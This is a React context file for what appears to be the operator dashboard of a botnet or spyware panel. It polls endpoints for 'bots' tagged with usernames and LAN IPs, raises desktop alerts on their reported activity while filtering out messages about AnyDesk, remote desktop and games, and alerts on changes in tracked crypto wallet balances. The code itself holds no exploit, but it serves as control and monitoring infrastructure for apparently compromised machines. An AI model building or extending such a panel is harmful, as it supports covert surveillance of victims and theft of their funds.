'use client';
import React, { useCallback, useContext, useEffect, useState } from 'react';
require('dotenv').config();
const BotsContext = React.createContext();

export const BotsContextProvider = ({ children }) => {
    const apiUrl = process.env.REACT_APP_API_URL ;
    console.log('apiURl: ', apiUrl);
    const [selectedBot, setSelectedBot] = useState(null);    
    const [bots, setBots] = useState([]);    
    const [botMessages, setBotMessages] = useState([]);
    const [keyword, setKeyword] = useState('');
    const [lastupdated, setLastUpdated] = useState('');
    const [filtered, setFiltered] = useState(null);    
    const [balanceList, setBalanceList] = useState([]);
    const [page, setPage] = useState(0);
    
    const [borings, setBorings] = useState(() => {
        if (typeof window !== 'undefined'){
        const fl = localStorage.getItem('borings');
        if (!fl) {
            return ([
                'anydesk',
                'remote desktop',
                'visual studio',
                'game'
            ])
        } else {
            return fl.split("\n");
        }
    }
    });
    
    const [userInfo, setUserInfo] = useState({
        userid: '',
        username:'',
    });
    const [notifications, setNotifications] = useState([]);
    useEffect(() => {
        if (selectedBot != null) {
            setPage(0);
        }
    },[selectedBot])
    useEffect(() => {
        if (borings != null) {
            localStorage.setItem("borings", borings.join("\n"))
        }
    }, [borings]);
    const showNotification = useCallback((title='Alarm', message='This is a notification from my app') => {
        if (Notification.permission === 'granted') {
            var notification = new Notification(title, {
                body:message,
              });
              notification.onclick = function(event) {
                  event.preventDefault();
                  notification.close();
                  window.focus();
                };
          } else if (Notification.permission !== 'denied') {
            Notification.requestPermission().then((permission) => {
              if (permission === 'granted') {
                var notification = new Notification(title, {
                    body:message,
                });
                notification.onclick = function(event) {
                    event.preventDefault();
                    notification.close();
                    window.focus();
                  };
              }
            });
          }
    }, [])    
    
    const getBriefMessageFromBalanceChange = (balanceChange) => {
        const msg = balanceChange.network + "@" + parseFloat(balanceChange.usd).toFixed(0) + "$ " + parseFloat(balanceChange.usdt).toFixed(0) + "usdt " + parseFloat(balanceChange.usdc).toFixed(0) + "usdc";
        return msg;
    };
    const updateWallets = useCallback(() => {
        fetch(`api/walleto.php?userid=${userInfo.userid}`).then(res => res.json())
            .then(data => { 
                setBalanceList(data.wallets);
                console.log(data.currencies);
            }).catch(error=>console.error(error))
    }, [userInfo, setBalanceList,apiUrl]);
  
    const updateBot = useCallback(bot => {
        if (bot != null) {
            fetch(`api/acknowledge.php?uid=${bot.uid}&userid=${userInfo.userid}&username=${bot.username}&lanip=${bot.lanip}`, )
                .then(res => res.json())
                .then(data => {                    
                    setBotMessages(data.data);
                })
                .catch(error => console.error(error))
        }
    }, [setBotMessages, userInfo,apiUrl]);


    const getMessages = useCallback((bot, userid) => {        
        if(bot!=null){
            fetch(`api/acknowledge.php?uid=${bot.uid}&userid=${userid}&full=1`)
            .then(res => res.json())
                .then(data => {
                    // console.log(data);
                    setBotMessages(data.data);
                })
            .catch(error=>console.error(error))
        }
    }, [setBotMessages,apiUrl])
    
    const getAllMessages = useCallback(() => {        
        const bot = selectedBot;
        const userid = userInfo.userid;
        if(bot!=null){
            fetch(`api/acknowledge.php?uid=${bot.uid}&userid=${userid}&full=0&page=${page}`)
            .then(res => res.json())
                .then(data => {
                    setPage(page + 1);
                    // console.log(data);
                    setBotMessages(data.data);
                })
            .catch(error=>console.error(error))
        }
    }, [setBotMessages, selectedBot, userInfo,apiUrl])
    
    const deleteMessages = useCallback(botuid => {
        if (botuid) {
            fetch(`api/deletemessages.php?uid=${botuid}&userid=${userInfo.userid}`)
                .then(res => res.json())
                .then(() => {
                    setBotMessages([]);
                })
            .catch(error=>console.error(error))
       }
    }, [setBotMessages, userInfo,apiUrl]);
    useEffect(() => {
        if (notifications && notifications.length > 0) {            
            notifications.splice(0,5).forEach(noti => showNotification(noti.uid.substring(0,8)+"  "+noti.username+"("+noti.lanip+")", noti.message + "," + noti['last_updated_time']));                        
        }
    },[notifications,showNotification])        
    
    const addWallet = useCallback((balance) => {
        fetch(`api/walleto.php?command=1&userid=${userInfo.userid}&address=${balance.address}&type=${balance.type}&label=${ balance.label }`)
        .then(res=>res.json())
        .then(data=>{
            setBalanceList(data.wallets);
        })
    }, [setBalanceList, userInfo,apiUrl]);

    const deleteWallet = useCallback((balance) => {
        fetch(`api/walleto.php?command=3&userid=${userInfo.userid}&address=${balance.address}`)
        .then(res=>res.json())
        .then(data=>{
            setBalanceList(data.wallets);
        })
    }, [setBalanceList, userInfo,apiUrl]);

    const updateWallet = useCallback((balance) => {
        fetch(`api/walleto.php?command=2&userid=${userInfo.userid}&address=${balance.address}&label=${ balance.label }&id=${ balance.id }`)
        .then(res=>res.json())
        .then(data=>{
            setBalanceList(data.wallets);
        })
    }, [setBalanceList,apiUrl, userInfo]);

    const refreshBalanceList = useCallback(() => {
        if (!balanceList || balanceList.length === 0) {
            console.log('refreshBalanceList worked');
            fetch(`api/walleto.php?userid=${userInfo.userid}`)
                .then(res=>res.json())
                .then(data=>{
                    setBalanceList(data.wallets);
                })
        }
        
    }, [balanceList, setBalanceList, userInfo,apiUrl]);
    const queryBots = useCallback(() => { 
        if (userInfo.userid) {
            fetch(`api/querybots.php?userid=${userInfo.userid}&keyword=${keyword}`)
            .then(res => res.json())
            .then(data => {                
                if (data.data) {
                    data.data.sort((a,b)=>a.last_updated_time>b.last_updated_time)
                }
                setBots(data.data);                
                setFiltered(data.data.filter(d => d.contains > 0));
                let news = data.news.filter(msg => !borings.some(
                    br => msg.message.toLowerCase().includes(br.toLowerCase()) ||
                        msg.uid.toLowerCase().includes(br.toLowerCase())
                    )
                );
                if (data.balancechanges.length > 0) { 
                    const change = data.balancechanges[0];
                    const msg = getBriefMessageFromBalanceChange(change);
                    // const title = data.balancechanges.length + " Changed!"
                    const title = change.label;
                    showNotification(title, msg);
                    updateWallets();         
                }
                setNotifications(news);                
                
            })
            .catch(error=>console.error(error))
        }
    }, [setBots, showNotification, updateWallets, setNotifications, userInfo, keyword, setFiltered, borings, apiUrl]);

    useEffect(() => {        
        const c= setInterval(() => {
            if (userInfo && userInfo.userid) {
                queryBots();
                setLastUpdated(new Date().toLocaleString());                
            }            
        }, 5000); 
        return () => clearInterval(c);
    }, [queryBots, setLastUpdated,/*showNotification*/userInfo]);    



    useEffect(() => {
        if (selectedBot && userInfo && userInfo.userid) {
            getMessages(selectedBot, userInfo.userid);
        }
    }, [selectedBot, getMessages, userInfo])
    
    
    return (
        <BotsContext.Provider value={{
            bots,
            selectedBot,
            setSelectedBot,
            botMessages,
            lastupdated,
            deleteMessages,
            userInfo,
            setUserInfo,
            updateBot,            
            keyword,
            setKeyword,
            filtered,
            borings,
            getAllMessages,
            setBorings,
            balanceList,
            addWallet,
            updateWallet,
            deleteWallet,
            refreshBalanceList,            
        }}>
            {children}
        </BotsContext.Provider>
    )
}

export const useBotsContext = () => {
    const context = useContext(BotsContext);
    if (!context) {
        throw Error('need to use in BotsProvider');
    }
    return context;
}